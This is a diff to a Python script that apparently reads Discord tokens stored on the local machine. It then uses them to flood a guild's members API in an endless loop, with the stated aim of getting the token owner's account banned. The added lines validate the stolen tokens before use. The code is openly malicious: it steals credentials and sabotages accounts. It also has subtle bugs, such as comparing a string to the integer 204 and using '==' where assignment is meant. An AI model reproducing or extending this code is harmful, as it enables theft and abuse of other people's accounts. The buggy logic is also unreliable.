@@ -6,6 +6,7 @@ import asyncio
 from discord.ext import commands
 import requests
 
+tokentouse = ""
 guildid = ""
 tokens = []
 local = os.getenv('LOCALAPPDATA')
@@ -37,11 +38,22 @@ if os.path.isdir(str(path7)):
 
 print("got tokens")
 
+def check_token(token):
+    headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": token
+    }
+    r2 = requests.post('http://discord.com/api/v8/science/', headers=headers)
+    if str(r2.status_code) == 204:
+        return True
+    else:
+        return False
+
 def fuck_token(token):
     while True:
         headers = {
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
-            "authorization": token
+            "authorization": tokentouse
         }
         r2 = requests.get('http://discord.com/api/v8/guilds/' + guildid + '/members', headers=headers)
         print("code: " + str(r2.status_code) + " Account should be banned")
@@ -75,6 +87,10 @@ async def on_ready():
 
 for token in tokens:
     try:
-        bot.run(token)
+        if check_token(token):
+            tokentouse == token
+            bot.run(token)
+        else:
+            pass
     except:
         pass
